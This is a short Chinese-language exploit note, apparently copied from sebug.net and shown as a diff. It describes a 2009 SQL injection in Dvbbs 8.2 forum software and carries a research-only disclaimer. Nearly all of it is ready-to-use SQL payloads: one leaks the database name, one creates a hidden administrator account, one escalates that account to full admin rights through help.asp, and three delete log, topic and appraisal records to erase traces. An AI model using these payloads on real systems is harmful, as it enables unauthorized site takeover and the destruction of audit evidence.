@@ -1,0 +1,13 @@
+Dvbbs 8.2 SQL injection 0day(2009-12-31)
+
+测试方法:
+[www.sebug.net]
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!发帖子，标题为下面的sql语句，然后点评论。0为中立, 1为支持, 2为反对 都行。
+这时sql语句被执行
+库名：a'','''',1,''akai'',''2008-2-4'','''',2);update/**/dv_user/**/set/**/useremail=db_name()/**/where/**/username=''akai''--
+
+复制代码加前台和后台管理员：a'','''',1,''akai'',''2008-2-4'','''',2);update dv_user set UserGroupID=1 where username=''akai'';insert into dv_admin(Username,Password,Flag,Adduser)values(''akai'',''965eb72c92a549dd'','',4,'',''akai'')--
+
+复制代码进入后台,通过注入再获取全部权限：http://www.xxx.com/Admin/help.asp?action=view&id=1;update/**/dv_admin/**/set/**/flag=''1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45''/**/where/**/username=''akai''--
+
+复制代码清理数据库记录（有三个表）：http://www.xxx.com/Admin/help.asp?action=view&id=1;delete/**/from/**/dv_log/**/where/**/l_username=''akai'';delete/**/from/**/dv_topic/**/where/**/PostUsername=''akai'';delete/**/from/**/Dv_Appraise/**/where/**/UserName=''akai''--
